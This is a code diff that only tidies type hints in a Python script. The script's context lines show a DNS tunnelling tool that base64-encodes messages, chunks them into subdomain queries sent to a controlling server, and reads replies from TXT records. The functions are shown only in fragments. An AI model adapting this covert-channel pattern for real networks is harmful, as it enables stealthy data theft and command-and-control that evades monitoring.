@@ -61,7 +61,7 @@ def control_argment():
     return valuable
 
 
-def parse_message(message:str, length:int) ->list:
+def parse_message(message:str, length:int) -> list:
     """
     1. encode the message to base64
     2. make the list of the message split by the length
@@ -71,7 +71,7 @@ def parse_message(message:str, length:int) ->list:
     separated = [encoded[i: i+length] for i in range(0, len(encoded), length)]
     return separated
 
-def exfiltrate(message:str, hostname:str):
+def exfiltrate(message:str, hostname:str) -> list:
     """exfiltrate messages to auth server, and query 'A' rr for fake"""
     try:
         qname = message + '.' + hostname
@@ -81,7 +81,7 @@ def exfiltrate(message:str, hostname:str):
         pass
         # print("Can't exfiltrate or no RR")
 
-def query_value(message:list, hostname:str) ->list:
+def query_value(message:list, hostname:str) -> list:
     """get messages from auth server using by 'TXT' rr"""
     payload = message + '.' + hostname
     response = dns.resolver.query(payload, 'TXT')
@@ -95,7 +95,7 @@ def query_value(message:list, hostname:str) ->list:
         return 0
 
 
-def decipher(answer: list) ->str:
+def decipher(answer: list) -> str:
     """
     - Gather the TXT query's domain authentication value
     - Decode the strings when the string is decode by base64
@@ -107,7 +107,7 @@ def decipher(answer: list) ->str:
     return response
 
 
-def main():
+def main() -> str:
     valuable = control_argment()
     hostnmae = valuable['hostname']
     interval = valuable['interval']
